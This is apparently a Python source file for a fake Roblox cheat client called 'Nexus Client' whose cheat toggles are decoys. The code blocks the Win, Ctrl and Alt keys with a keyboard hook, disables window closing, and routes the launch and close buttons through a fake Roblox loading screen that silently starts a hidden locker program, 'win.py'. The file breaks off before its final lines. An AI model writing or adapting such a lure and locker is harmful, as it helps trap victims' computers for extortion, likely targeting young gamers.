# -*- coding: utf-8 -*-
"""
Nexus Client — современный GUI с 3D-элементами.
Запускается через start.bat.
Требует win.py рядом.
"""

import tkinter as tk
import subprocess
import sys
import os
import random
import math
import traceback
import webbrowser
import ctypes
from ctypes import wintypes

HERE = os.path.dirname(os.path.abspath(__file__))
LOCKER = os.path.join(HERE, "win.py")
ERROR_LOG = os.path.join(HERE, "loader_error.txt")

TG = "@belashuak_228"
TG_LINK = "https://t.me/ProLensKe"
CHANNEL = "ProLens"


# ─────────────── ЦВЕТА ───────────────
BG_DARK    = "#0a0a0f"
BG_SIDEBAR = "#0d0d14"
BG_CARD    = "#14141d"
BG_CARD_H  = "#1d1d2a"
BG_HEADER  = "#07070b"
ACCENT     = "#8b5cf6"
ACCENT_H   = "#a78bfa"
ACCENT_D   = "#4c1d95"
GREEN      = "#22c55e"
RED        = "#ef4444"
YELLOW     = "#eab308"
CYAN       = "#06b6d4"
TEXT_MAIN  = "#f5f5f8"
TEXT_SUB   = "#8a8aa0"
BORDER     = "#242435"
BORDER_H   = "#3a3a52"
SHADOW     = "#050508"


def log_error(text):
    try:
        with open(ERROR_LOG, "w", encoding="utf-8") as f:
            f.write(text)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════
#  ХУК КЛАВИАТУРЫ — Win, Ctrl, Alt
# ═══════════════════════════════════════════════════════════
_hook_id = None
_hook_ref = None


def install_hook():
    global _hook_id, _hook_ref
    if sys.platform != "win32":
        return
    if _hook_id:
        return

    try:
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        WH_KEYBOARD_LL = 13

        class KB(ctypes.Structure):
            _fields_ = [
                ("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.c_void_p),
            ]

        HP = ctypes.WINFUNCTYPE(
            ctypes.c_ssize_t,
            ctypes.c_int,
            ctypes.c_void_p,
            ctypes.c_void_p,
        )

        user32.SetWindowsHookExW.restype = ctypes.c_void_p
        user32.SetWindowsHookExW.argtypes = [
            ctypes.c_int, HP, ctypes.c_void_p, ctypes.c_ulong,
        ]
        user32.CallNextHookEx.restype = ctypes.c_ssize_t
        user32.CallNextHookEx.argtypes = [
            ctypes.c_void_p, ctypes.c_int,
            ctypes.c_void_p, ctypes.c_void_p,
        ]
        user32.UnhookWindowsHookEx.restype = ctypes.c_bool
        user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]

        BLOCKED = {
            0x5B, 0x5C,        # LWin, RWin
            0x11, 0xA2, 0xA3,  # Ctrl
            0x12, 0xA4, 0xA5,  # Alt
        }

        def handler(nCode, wParam, lParam):
            if nCode < 0:
                return user32.CallNextHookEx(
                    None, nCode, wParam, lParam)
            if nCode == 0:
                try:
                    kb = ctypes.cast(
                        lParam, ctypes.POINTER(KB)).contents
                    if kb.vkCode in BLOCKED:
                        return 1
                except Exception:
                    pass
            return user32.CallNextHookEx(
                None, nCode, wParam, lParam)

        _hook_ref = HP(handler)
        _hook_id = user32.SetWindowsHookExW(
            WH_KEYBOARD_LL, _hook_ref, 0, 0)

        if not _hook_id:
            err = ctypes.get_last_error()
            log_error("HOOK ERROR: SetWindowsHookExW failed "
                      "code=%d" % err)
            _hook_ref = None
    except Exception:
        log_error("HOOK EXCEPTION:\n%s" % traceback.format_exc())
        _hook_id = None
        _hook_ref = None


def uninstall_hook():
    global _hook_id, _hook_ref
    if sys.platform != "win32":
        return
    if not _hook_id:
        return
    try:
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        user32.UnhookWindowsHookEx.restype = ctypes.c_bool
        user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
        user32.UnhookWindowsHookEx(_hook_id)
    except Exception:
        pass
    _hook_id = None
    _hook_ref = None


# ═══════════════════════════════════════════════════════════
#  3D-КАРТОЧКА
# ═══════════════════════════════════════════════════════════
class Card3D:
    def __init__(self, parent, x, y, w, h,
                 bg=BG_CARD, border=BORDER):
        self.hover = False

        self.shadow = tk.Frame(parent, bg=SHADOW)
        self.shadow.place(x=x + 3, y=y + 3, width=w, height=h)

        self.body = tk.Frame(parent, bg=bg,
                             highlightthickness=1,
                             highlightbackground=border)
        self.body.place(x=x, y=y, width=w, height=h)

        self.x = x
        self.y = y
        self.w = w
        self.h = h

    def lift(self):
        if self.hover:
            return
        self.hover = True
        self.body.place(x=self.x - 2, y=self.y - 2,
                        width=self.w + 4, height=self.h + 4)
        self.shadow.place(x=self.x + 5, y=self.y + 5,
                          width=self.w + 2, height=self.h + 2)

    def drop(self):
        if not self.hover:
            return
        self.hover = False
        self.body.place(x=self.x, y=self.y,
                        width=self.w, height=self.h)
        self.shadow.place(x=self.x + 3, y=self.y + 3,
                          width=self.w, height=self.h)


# ═══════════════════════════════════════════════════════════
#  ГРАДИЕНТ-ФОН
# ═══════════════════════════════════════════════════════════
class GradientBackground:
    def __init__(self, canvas, w, h):
        self.canvas = canvas
        self.w = w
        self.h = h
        self.offset = 0
        self.running = True
        self._draw()

    def _draw(self):
        if not self.running:
            return
        try:
            self.canvas.delete("bg")
            step = 4
            for y in range(0, self.h, step):
                k = (y + self.offset) % self.h / self.h
                r = int(0x0a + (0x14 - 0x0a) * k)
                g = int(0x0a + (0x0d - 0x0a) * k)
                b = int(0x0f + (0x1a - 0x0f) * k)
                color = "#%02x%02x%02x" % (r, g, b)
                self.canvas.create_line(0, y, self.w, y,
                                        fill=color, tags="bg")
            self.offset = (self.offset + 1) % self.h
            self.canvas.after(50, self._draw)
        except Exception:
            self.running = False

    def stop(self):
        self.running = False


# ═══════════════════════════════════════════════════════════
#  ЧАСТИЦЫ
# ═══════════════════════════════════════════════════════════
class ParticleField:
    def __init__(self, canvas, w, h, count=70):
        self.canvas = canvas
        self.w = w
        self.h = h
        self.particles = []
        for _ in range(count):
            p = canvas.create_oval(0, 0, 2, 2,
                                   fill=ACCENT, outline="",
                                   tags="particle")
            self.particles.append({
                "id": p,
                "x": random.uniform(0, w),
                "y": random.uniform(0, h),
                "vy": random.uniform(-0.5, -1.5),
                "vx": random.uniform(-0.2, 0.2),
                "size": random.uniform(1, 2.5),
                "phase": random.uniform(0, 6.28),
                "color": random.choice([ACCENT, CYAN, ACCENT_H]),
            })

    def animate(self, t=0):
        try:
            for p in self.particles:
                p["x"] += p["vx"] + math.sin(
                    t / 40 + p["phase"]) * 0.3
                p["y"] += p["vy"]
                if p["y"] < -10:
                    p["y"] = self.h + 10
                    p["x"] = random.uniform(0, self.w)
                if p["x"] < -10:
                    p["x"] = self.w + 10
                if p["x"] > self.w + 10:
                    p["x"] = -10
                s = p["size"]
                self.canvas.coords(p["id"],
                                   p["x"], p["y"],
                                   p["x"] + s, p["y"] + s)
                self.canvas.itemconfig(p["id"], fill=p["color"])
            self.canvas.after(30, lambda: self.animate(t + 1))
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════
#  ВСПЛЫВАШКА
# ═══════════════════════════════════════════════════════════
def show_popup(root, text, title="Nexus", duration=3000,
               color=ACCENT, W=1920, H=1080):
    try:
        popup = tk.Toplevel(root)
        popup.overrideredirect(True)
        popup.attributes("-topmost", True)
        popup.configure(bg=color)

        pw, ph = 380, 110
        px = W - pw - 30
        py = H - ph - 30
        popup.geometry("%dx%d+%d+%d" % (pw, ph, px + 400, py))

        inner = tk.Frame(popup, bg=BG_CARD)
        inner.place(x=3, y=3, width=pw - 6, height=ph - 6)

        tk.Label(inner, text=title, bg=BG_CARD, fg=color,
                 font=("Segoe UI", 11, "bold")).place(x=18, y=12)
        tk.Label(inner, text=text, bg=BG_CARD, fg=TEXT_MAIN,
                 font=("Segoe UI", 10), justify="left",
                 wraplength=pw - 50).place(x=18, y=42)

        def slide_in():
            try:
                cur = popup.winfo_x()
                if cur > px:
                    popup.geometry("+%d+%d" % (cur - 30, py))
                    popup.after(12, slide_in)
                else:
                    popup.geometry("+%d+%d" % (px, py))
            except Exception:
                pass

        slide_in()
        popup.after(duration,
                    lambda: popup.destroy()
                    if popup.winfo_exists() else None)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════
#  ГЛАВНОЕ ОКНО
# ═══════════════════════════════════════════════════════════
def main():
    try:
        root = tk.Tk()
        root.title("Nexus Client")
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.configure(bg=BG_DARK)
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        W = root.winfo_screenwidth()
        H = root.winfo_screenheight()
        SIDEBAR_W = 260
        HEADER_H = 64

        # ───── ФОН ─────
        bg_canvas = tk.Canvas(root, bg=BG_DARK, highlightthickness=0)
        bg_canvas.place(x=0, y=0, width=W, height=H)
        GradientBackground(bg_canvas, W, H)
        particles = ParticleField(bg_canvas, W, H, count=70)
        particles.animate()

        # ───── ЗАПУСК ЛОКЕРА ─────
        def launch_locker():
            try:
                # 1. Снимаем хук ДО всего
                uninstall_hook()

                # 2. Прячем GUI
                root.withdraw()

                # 3. Фейковый экран Roblox
                splash = tk.Toplevel()
                splash.overrideredirect(True)
                splash.attributes("-topmost", True)
                splash.configure(bg="#000000")
                splash.geometry("%dx%d+0+0" % (W, H))

                c = tk.Canvas(splash, bg="#000000",
                              highlightthickness=0,
                              width=W, height=H)
                c.pack()
                cx, cy = W // 2, H // 2

                c.create_text(cx, cy - 100, text="ROBLOX",
                              fill="#ffffff",
                              font=("Segoe UI", 64, "bold"))
                c.create_text(cx, cy - 30, text="Loading...",
                              fill="#cccccc",
                              font=("Segoe UI", 18))

                bw = 500
                bx1 = cx - bw // 2
                by1 = cy + 30
                by2 = by1 + 30

                c.create_rectangle(bx1 - 3, by1 - 3,
                                   bx1 + bw + 3, by2 + 3,
                                   outline="#666", width=2)
                bar = c.create_rectangle(bx1, by1, bx1, by2,
                                         fill="#00a2ff", outline="")
                status = c.create_text(cx, cy + 100, text="",
                                       fill="#888",
                                       font=("Segoe UI", 12))

                def progress(i=0):
                    try:
                        if i > 100:
                            splash.destroy()

                            # ─────────────────────────
                            #  МГНОВЕННО убиваем GUI,
                            #  чтобы ни одно окно не всплыло
                            #  обратно при нажатии клавиш.
                            #  Делаем это ДО запуска win.py.
                            # ─────────────────────────
                            try:
                                bg_canvas.destroy()
                            except Exception:
                                pass
                            try:
                                root.quit()
                            except Exception:
                                pass
                            try:
                                root.destroy()
                            except Exception:
                                pass

                            # Запускаем win.py в отдельном
                            # detached-процессе, чтобы он
                            # не зависел от этого окна
                            py = sys.executable
                            subprocess.Popen(
                                [py, LOCKER],
                                shell=False,
                                close_fds=True,
                                creationflags=0x08000000,
                            )

                            # Мгновенное завершение процесса —
                            # никакие виджеты не вернутся
                            os._exit(0)
                            return

                        fill_x = bx1 + int(bw * i / 100)
                        c.coords(bar, bx1, by1, fill_x, by2)

                        if i < 30:
                            txt = "Connecting to Roblox..."
                        elif i < 60:
                            txt = "Authenticating..."
                        elif i < 85:
                            txt = "Loading assets..."
                        else:
                            txt = "Starting Roblox..."

                        c.itemconfig(status, text=txt)
                        splash.after(
                            random.randint(40, 80),
                            lambda: progress(
                                i + random.randint(2, 5)))
                    except Exception:
                        log_error("PROGRESS ERROR:\n%s" %
                                  traceback.format_exc())

                progress()
            except Exception:
                log_error("LAUNCH ERROR:\n%s" %
                          traceback.format_exc())
                try:
                    subprocess.Popen(
                        [sys.executable, LOCKER],
                        shell=False,
                        close_fds=True,
                        creationflags=0x08000000)
                except Exception:
                    pass
                try:
                    uninstall_hook()
                except Exception:
                    pass
                try:
                    os._exit(0)
                except Exception:
                    pass

        # ───── HOVER ─────
        def bind_hover(widget, normal_bg, hover_bg,
                       normal_fg=None, hover_fg=None):
            def on_enter(_):
                try:
                    widget.config(bg=hover_bg)
                    if hover_fg:
                        widget.config(fg=hover_fg)
                except Exception:
                    pass

            def on_leave(_):
                try:
                    widget.config(bg=normal_bg)
                    if normal_fg:
                        widget.config(fg=normal_fg)
                except Exception:
                    pass

            widget.bind("<Enter>", on_enter)
            widget.bind("<Leave>", on_leave)

        # ───── HEADER ─────
        header = tk.Frame(root, bg=BG_HEADER, height=HEADER_H)
        header.place(x=0, y=0, width=W, height=HEADER_H)
        header.pack_propagate(False)

        tk.Label(header, text="◆  NEXUS  CLIENT",
                 bg=BG_HEADER, fg=ACCENT,
                 font=("Segoe UI", 15, "bold")
                 ).pack(side="left", padx=25)

        status_dot = tk.Label(header, text="●", bg=BG_HEADER,
                              fg=GREEN, font=("Segoe UI", 16))
        status_dot.pack(side="right", padx=(0, 15))
        tk.Label(header, text="CONNECTED", bg=BG_HEADER,
                 fg=GREEN, font=("Segoe UI", 9, "bold")
                 ).pack(side="right", padx=(0, 5))

        btn_x = tk.Label(header, text="✕", bg=BG_HEADER,
                         fg=TEXT_SUB,
                         font=("Segoe UI", 15, "bold"),
                         padx=18, cursor="hand2")
        btn_x.pack(side="right", padx=5)
        btn_x.bind("<Button-1>", lambda e: launch_locker())
        bind_hover(btn_x, BG_HEADER, RED, TEXT_SUB, "white")

        btn_min = tk.Label(header, text="—", bg=BG_HEADER,
                           fg=TEXT_SUB,
                           font=("Segoe UI", 15, "bold"),
                           padx=18, cursor="hand2")
        btn_min.pack(side="right", padx=5)
        bind_hover(btn_min, BG_HEADER, BG_CARD,
                   TEXT_SUB, TEXT_MAIN)

        def blink():
            try:
                cur = status_dot.cget("fg")
                status_dot.config(
                    fg=BG_HEADER if cur == GREEN else GREEN)
                root.after(700, blink)
            except Exception:
                pass

        blink()

        # ───── SIDEBAR ─────
        sidebar = tk.Frame(root, bg=BG_SIDEBAR)
        sidebar.place(x=0, y=HEADER_H,
                      width=SIDEBAR_W, height=H - HEADER_H)

        logo_frame = tk.Frame(sidebar, bg=BG_SIDEBAR)
        logo_frame.pack(fill="x", pady=(30, 0))
        tk.Label(logo_frame, text="NEXUS", bg=BG_SIDEBAR,
                 fg=ACCENT,
                 font=("Segoe UI", 28, "bold")).pack()
        tk.Label(logo_frame, text="script executor v4.0",
                 bg=BG_SIDEBAR, fg=TEXT_SUB,
                 font=("Segoe UI", 9)).pack(pady=(0, 25))

        tk.Frame(sidebar, bg=BORDER, height=1).pack(
            fill="x", padx=20)

        # ───── PAGES ─────
        MAIN_W = W - SIDEBAR_W
        main_area = tk.Frame(root, bg=BG_DARK)
        main_area.place(x=SIDEBAR_W, y=HEADER_H,
                        width=MAIN_W, height=H - HEADER_H)

        pages = {}
        menu_labels = {}

        def make_page(name):
            f = tk.Frame(main_area, bg=BG_DARK)
            pages[name] = f
            return f

        def switch_page(name):
            for f in pages.values():
                f.pack_forget()
            if name not in pages:
                return
            pages[name].pack(fill="both", expand=True)
            for n, lbl in menu_labels.items():
                if n == name:
                    lbl.config(bg=BG_CARD, fg=ACCENT)
                else:
                    lbl.config(bg=BG_SIDEBAR, fg=TEXT_SUB)

        menu_items = [
            ("●", "Dashboard"),
            ("◎", "Aim Assist"),
            ("◉", "Visuals"),
            ("⚡", "Exploits"),
            ("◈", "Profile"),
            ("⚙", "Settings"),
            ("ℹ", "About"),
        ]

        for icon, name in menu_items:
            row = tk.Frame(sidebar, bg=BG_SIDEBAR)
            row.pack(fill="x", padx=10, pady=2)
            lbl = tk.Label(row,
                           text="   %s   %s" % (icon, name),
                           bg=BG_SIDEBAR, fg=TEXT_SUB,
                           font=("Segoe UI", 11),
                           anchor="w", padx=15, pady=13,
                           cursor="hand2")
            lbl.pack(fill="x")
            lbl.bind("<Button-1>",
                     lambda e, n=name: switch_page(n))
            menu_labels[name] = lbl

            def make_enter(l=lbl):
                def on_enter(_):
                    if l.cget("fg") != ACCENT:
                        l.config(bg=BG_CARD, fg=TEXT_MAIN)
                return on_enter

            def make_leave(l=lbl):
                def on_leave(_):
                    if l.cget("fg") != ACCENT:
                        l.config(bg=BG_SIDEBAR, fg=TEXT_SUB)
                return on_leave

            lbl.bind("<Enter>", make_enter())
            lbl.bind("<Leave>", make_leave())

        info = tk.Frame(sidebar, bg=BG_CARD)
        info.place(x=15, y=H - 220,
                   width=SIDEBAR_W - 30, height=110)

        tk.Label(info, text="●  UNDETECTED",
                 bg=BG_CARD, fg=GREEN,
                 font=("Segoe UI", 10, "bold")
                 ).place(x=15, y=12)
        tk.Label(info, text="Version 4.0  |  Build 2026",
                 bg=BG_CARD, fg=TEXT_SUB,
                 font=("Segoe UI", 8)).place(x=15, y=35)

        tg_lbl = tk.Label(info, text=CHANNEL,
                          bg=BG_CARD, fg=ACCENT,
                          font=("Segoe UI", 9, "bold"),
                          cursor="hand2")
        tg_lbl.place(x=15, y=55)
        tg_lbl.bind("<Button-1>",
                    lambda e: webbrowser.open(TG_LINK))
        bind_hover(tg_lbl, BG_CARD, BG_CARD_H,
                   ACCENT, ACCENT_H)

        tk.Label(info, text=TG, bg=BG_CARD, fg=TEXT_SUB,
                 font=("Segoe UI", 8)).place(x=15, y=80)

        # ───── TOGGLE ─────
        def make_toggle(parent, x, y, name, desc,
                        default_on=False):
            c3d = Card3D(parent, x, y, MAIN_W - 80, 76)

            tk.Label(c3d.body, text=name, bg=BG_CARD,
                     fg=TEXT_MAIN,
                     font=("Segoe UI", 12, "bold")
                     ).place(x=25, y=15)
            tk.Label(c3d.body, text=desc, bg=BG_CARD,
                     fg=TEXT_SUB,
                     font=("Segoe UI", 9)
                     ).place(x=25, y=42)

            state = {"on": default_on}

            toggle = tk.Label(c3d.body,
                              text="ON" if default_on else "OFF",
                              bg=GREEN if default_on
                              else BG_HEADER,
                              fg="white" if default_on
                              else TEXT_SUB,
                              font=("Segoe UI", 10, "bold"),
                              width=8, pady=10,
                              cursor="hand2")
            toggle.place(x=MAIN_W - 240, y=15)

            def on_click(_=None):
                state["on"] = not state["on"]
                if state["on"]:
                    toggle.config(text="ON",
                                  bg=GREEN, fg="white")
                    show_popup(
                        root,
                        'Функция "%s" включена' % name,
                        title="✓ Активировано",
                        duration=2200,
                        color=GREEN, W=W, H=H)
                else:
                    toggle.config(text="OFF",
                                  bg=BG_HEADER,
                                  fg=TEXT_SUB)
                    show_popup(
                        root,
                        'Функция "%s" выключена' % name,
                        title="✕ Отключено",
                        duration=2200,
                        color=RED, W=W, H=H)

            toggle.bind("<Button-1>", on_click)

            def on_enter(_):
                try:
                    c3d.body.config(bg=BG_CARD_H,
                                    highlightbackground=BORDER_H)
                except Exception:
                    pass
                c3d.lift()

            def on_leave(_):
                try:
                    c3d.body.config(bg=BG_CARD,
                                    highlightbackground=BORDER)
                except Exception:
                    pass
                c3d.drop()

            c3d.body.bind("<Enter>", on_enter)
            c3d.body.bind("<Leave>", on_leave)

        # ───── DASHBOARD ─────
        dash = make_page("Dashboard")
        tk.Label(dash, text="Dashboard", bg=BG_DARK,
                 fg=TEXT_MAIN,
                 font=("Segoe UI", 26, "bold")
                 ).place(x=30, y=25)
        tk.Label(dash,
                 text="Overview of your Nexus Client session",
                 bg=BG_DARK, fg=TEXT_SUB,
                 font=("Segoe UI", 10)).place(x=32, y=72)

        stat_w = (MAIN_W - 100) // 3
        stats = [
            ("MEMBERS", "12,847", GREEN),
            ("EXECUTED", "3,592", ACCENT),
            ("RATING", "4.9 ★", YELLOW),
        ]
        for i, (lbl, val, col) in enumerate(stats):
            cx = 30 + i * (stat_w + 20)
            c3d = Card3D(dash, cx, 115, stat_w, 110)

            tk.Label(c3d.body, text=lbl, bg=BG_CARD,
                     fg=TEXT_SUB,
                     font=("Segoe UI", 9, "bold")
                     ).place(x=20, y=15)
            tk.Label(c3d.body, text=val, bg=BG_CARD,
                     fg=col,
                     font=("Segoe UI", 22, "bold")
                     ).place(x=20, y=40)
            tk.Frame(c3d.body, bg=col, height=3).place(
                x=20, y=98, width=60)

            def make_stat_enter(c=c3d):
                def on_enter(_):
                    c.lift()
                return on_enter

            def make_stat_leave(c=c3d):
                def on_leave(_):
                    c.drop()
                return on_leave

            c3d.body.bind("<Enter>", make_stat_enter())
            c3d.body.bind("<Leave>", make_stat_leave())

        mod_frame = tk.Frame(dash, bg=BG_CARD,
                             highlightthickness=1,
                             highlightbackground=BORDER)
        mod_frame.place(x=30, y=250, width=MAIN_W - 60,
                        height=MAIN_W // 4)
        tk.Label(mod_frame, text="Active Modules",
                 bg=BG_CARD, fg=TEXT_MAIN,
                 font=("Segoe UI", 14, "bold")
                 ).place(x=25, y=15)

        modules_list = [
            ("Auto Farm", "farm mobs, XP, money"),
            ("Kill Aura", "kill all in 30m radius"),
            ("Auto Raid", "auto raids, rare fruits"),
            ("ESP / Wallhack", "see mobs, players, chests"),
            ("God Mode", "invincibility"),
            ("Speed Hack x3", "3x movement speed"),
            ("Infinite Jump", "infinite jump and fly"),
            ("Teleport", "teleport to islands"),
        ]
        y_m = 60
        for name, desc in modules_list:
            tk.Label(mod_frame, text="+  " + name,
                     bg=BG_CARD, fg=TEXT_MAIN,
                     font=("Consolas", 11, "bold")
                     ).place(x=25, y=y_m)
            tk.Label(mod_frame, text="— " + desc,
                     bg=BG_CARD, fg=TEXT_SUB,
                     font=("Consolas", 10)
                     ).place(x=270, y=y_m)
            tk.Label(mod_frame, text="ON",
                     bg=BG_CARD, fg=GREEN,
                     font=("Consolas", 11, "bold")
                     ).place(x=MAIN_W - 160, y=y_m)
            y_m += 25

        # ───── AIM ASSIST ─────
        aim = make_page("Aim Assist")
        tk.Label(aim, text="Aim Assist", bg=BG_DARK,
                 fg=TEXT_MAIN,
                 font=("Segoe UI", 26, "bold")
                 ).place(x=30, y=25)
        tk.Label(aim,
                 text="Настройки наведения и стрельбы",
                 bg=BG_DARK, fg=TEXT_SUB,
                 font=("Segoe UI", 10)).place(x=32, y=72)
        for i, (n, d, on) in enumerate([
            ("Silent Aim",
             "Стреляет в противника без наведения", True),
            ("Aim Bot",
             "Автоматически целится в ближайшего", True),
            ("No Recoil", "Отключает отдачу оружия", False),
            ("Trigger Bot", "Стреляет при наведении", False),
            ("Hitbox Expander",
             "Увеличивает хитбокс", True),
            ("FOV Circle", "Показывает круг захвата", True),
        ]):
            make_toggle(aim, 30, 120 + i * 86, n, d, on)

        # ───── VISUALS ─────
        vis = make_page("Visuals")
        tk.Label(vis, text="Visuals", bg=BG_DARK,
                 fg=TEXT_MAIN,
                 font=("Segoe UI", 26, "bold")
                 ).place(x=30, y=25)
        tk.Label(vis, text="ESP и визуальные функции",
                 bg=BG_DARK, fg=TEXT_SUB,
                 font=("Segoe UI", 10)).place(x=32, y=72)
        for i, (n, d, on) in enumerate([
            ("Box ESP", "Рамки вокруг противников", True),
            ("Name ESP", "Ники игроков", True),
            ("Distance ESP", "Расстояние до цели", True),
            ("HP Bars", "Полоса здоровья", True),
            ("Chams", "Подсветка моделей", False),
            ("Fullbright", "Убирает темноту", True),
        ]):
            make_toggle(vis, 30, 120 + i * 86, n, d, on)

        # ───── EXPLOITS ─────
        exp = make_page("Exploits")
        tk.Label(exp, text="Exploits", bg=BG_DARK,
                 fg=TEXT_MAIN,
                 font=("Segoe UI", 26, "bold")
                 ).place(x=30, y=25)
        tk.Label(exp,
                 text="Функции для фарма и доминирования",
                 bg=BG_DARK, fg=TEXT_SUB,
                 font=("Segoe UI", 10)).place(x=32, y=72)
        for i, (n, d, on) in enumerate([
            ("Auto Farm",
             "Автофарм мобов, XP и денег", True),
            ("Kill Aura",
             "Убийство всех в радиусе 30 м", True),
            ("Auto Raid",
             "Авторейды и фарм фруктов", True),
            ("Teleport", "Телепорт по островам", True),
            ("Free Fruits", "Редкие фрукты", True),
            ("Auto Quest", "Автоквесты", False),
        ]):
            make_toggle(exp, 30, 120 + i * 86, n, d, on)

        # ───── PROFILE ─────
        prof = make_page("Profile")
        tk.Label(prof, text="Profile", bg=BG_DARK,
                 fg=TEXT_MAIN,
                 font=("Segoe UI", 26, "bold")
                 ).place(x=30, y=25)

        av_3d = Card3D(prof, 30, 115, 300, 340)

        av_canvas = tk.Canvas(av_3d.body, bg=BG_CARD,
                              highlightthickness=0,
                              width=300, height=180)
        av_canvas.pack()
        av_canvas.create_oval(100, 20, 200, 120,
                              fill=ACCENT, outline=ACCENT_H,
                              width=2)
        av_canvas.create_text(150, 70, text="U",
                              fill="white",
                              font=("Segoe UI", 40, "bold"))

        tk.Label(av_3d.body, text="User_2026",
                 bg=BG_CARD, fg=TEXT_MAIN,
                 font=("Segoe UI", 16, "bold")
                 ).pack(pady=(10, 0))
        tk.Label(av_3d.body, text="Premium Tier",
                 bg=BG_CARD, fg=YELLOW,
                 font=("Segoe UI", 10, "bold")
                 ).pack(pady=(2, 0))
        tk.Label(av_3d.body, text="Joined 12.03.2026",
                 bg=BG_CARD, fg=TEXT_SUB,
                 font=("Segoe UI", 9)).pack(pady=(15, 0))

        det_3d = Card3D(prof, 350, 115, MAIN_W - 420, 340)

        tk.Label(det_3d.body, text="Account Details",
                 bg=BG_CARD, fg=TEXT_MAIN,
                 font=("Segoe UI", 14, "bold")
                 ).place(x=25, y=20)

        details = [
            ("Username:", "User_2026"),
            ("Subscription:", "Premium (lifetime)"),
            ("License Key:", "NX-8847-2215-6690-XPRE"),
            ("Expires:", "Never"),
            ("Executions:", "3,592"),
            ("HWID:", "A8-F2-91-C3-B7-44"),
            ("Status:", "Active"),
            ("Trust Score:", "98 / 100"),
        ]
        y_d = 70
        for lbl, val in details:
            tk.Label(det_3d.body, text=lbl, bg=BG_CARD,
                     fg=TEXT_SUB,
                     font=("Segoe UI", 11)
                     ).place(x=25, y=y_d)
            tk.Label(det_3d.body, text=val, bg=BG_CARD,
                     fg=TEXT_MAIN,
                     font=("Segoe UI", 11, "bold")
                     ).place(x=180, y=y_d)
            tk.Frame(det_3d.body, bg=BORDER, height=1).place(
                x=25, y=y_d + 25, width=MAIN_W - 480)
            y_d += 32

        # ───── SETTINGS ─────
        st = make_page("Settings")
        tk.Label(st, text="Settings", bg=BG_DARK,
                 fg=TEXT_MAIN,
                 font=("Segoe UI", 26, "bold")
                 ).place(x=30, y=25)
        for i, (n, d, on) in enumerate([
            ("Auto-Launch",
             "Автозапуск при старте Windows", True),
            ("Stealth Mode",
             "Скрывать процесс", True),
            ("Save Config", "Сохранять настройки", True),
            ("Update Check", "Проверять обновления", True),
            ("Telegram Notify",
             "Уведомления в Telegram", False),
        ]):
            make_toggle(st, 30, 120 + i * 86, n, d, on)

        # ───── ABOUT ─────
        ab = make_page("About")
        tk.Label(ab, text="About", bg=BG_DARK,
                 fg=TEXT_MAIN,
                 font=("Segoe UI", 26, "bold")
                 ).place(x=30, y=25)
        about_text = (
            "NEXUS CLIENT  v4.0\n\n"
            "Universal Roblox Script Executor\n\n"
            "Один из самых мощных и стабильных "
            "клиентов\n"
            "для выполнения скриптов в Roblox.\n\n"
            "Возможности:\n"
            "  • Поддержка всех популярных игр\n"
            "  • Авто-инжект и авто-обновление\n"
            "  • Встроенные модули фарма\n"
            "  • ESP, Aim Assist, Visuals\n"
            "  • Защита от обнаружения\n\n"
            "Контакты:\n"
            "  Telegram: " + TG + "\n"
            "  Канал:    " + CHANNEL + "\n\n"
            "(c) 2026 Nexus Team"
        )
        tk.Label(ab, text=about_text, bg=BG_DARK,
                 fg=TEXT_SUB, font=("Consolas", 11),
                 justify="left").place(x=30, y=100)

        tg_btn = tk.Button(
            ab,
            text="📢  ПОДПИСАТЬСЯ НА " + CHANNEL.upper(),
            bg=ACCENT, fg="white",
            activebackground=ACCENT_H,
            activeforeground="white",
            relief="flat", bd=0,
            font=("Segoe UI", 13, "bold"),
            cursor="hand2",
            command=lambda: webbrowser.open(TG_LINK))
        tg_btn.place(x=30, y=H - 300,
                     width=MAIN_W - 80, height=50)

        # ───── НИЖНИЕ КНОПКИ ─────
        btn_w = (MAIN_W - 100) // 2
        btn_y = H - 110

        launch_shadow = tk.Frame(root, bg=SHADOW)
        launch_shadow.place(x=SIDEBAR_W + 33, y=btn_y + 3,
                            width=btn_w, height=60)

        btn_launch = tk.Button(root,
                               text="⚡  LAUNCH INJECTOR",
                               command=launch_locker,
                               bg=ACCENT, fg="white",
                               activebackground=ACCENT_H,
                               activeforeground="white",
                               relief="flat", bd=0,
                               font=("Segoe UI", 14, "bold"),
                               cursor="hand2")
        btn_launch.place(x=SIDEBAR_W + 30, y=btn_y,
                         width=btn_w, height=60)

        close_shadow = tk.Frame(root, bg=SHADOW)
        close_shadow.place(x=SIDEBAR_W + 53 + btn_w, y=btn_y + 3,
                           width=btn_w, height=60)

        btn_close = tk.Button(root,
                              text="✕  CLOSE CLIENT",
                              command=launch_locker,
                              bg=RED, fg="white",
                              activebackground="#ff6060",
                              activeforeground="white",
                              relief="flat", bd=0,
                              font=("Segoe UI", 14, "bold"),
                              cursor="hand2")
        btn_close.place(x=SIDEBAR_W + 50 + btn_w, y=btn_y,
                        width=btn_w, height=60)

        def launch_enter(_):
            try:
                btn_launch.place(x=SIDEBAR_W + 28, y=btn_y - 2)
                btn_launch.config(bg=ACCENT_H)
                launch_shadow.place(x=SIDEBAR_W + 35,
                                    y=btn_y + 5)
            except Exception:
                pass

        def launch_leave(_):
            try:
                btn_launch.place(x=SIDEBAR_W + 30, y=btn_y)
                btn_launch.config(bg=ACCENT)
                launch_shadow.place(x=SIDEBAR_W + 33,
                                    y=btn_y + 3)
            except Exception:
                pass

        def close_enter(_):
            try:
                btn_close.place(x=SIDEBAR_W + 48 + btn_w,
                                y=btn_y - 2)
                btn_close.config(bg="#ff6060")
                close_shadow.place(x=SIDEBAR_W + 55 + btn_w,
                                   y=btn_y + 5)
            except Exception:
                pass

        def close_leave(_):
            try:
                btn_close.place(x=SIDEBAR_W + 50 + btn_w,
                                y=btn_y)
                btn_close.config(bg=RED)
                close_shadow.place(x=SIDEBAR_W + 53 + btn_w,
                                   y=btn_y + 3)
            except Exception:
                pass

        btn_launch.bind("<Enter>", launch_enter)
        btn_launch.bind("<Leave>", launch_leave)
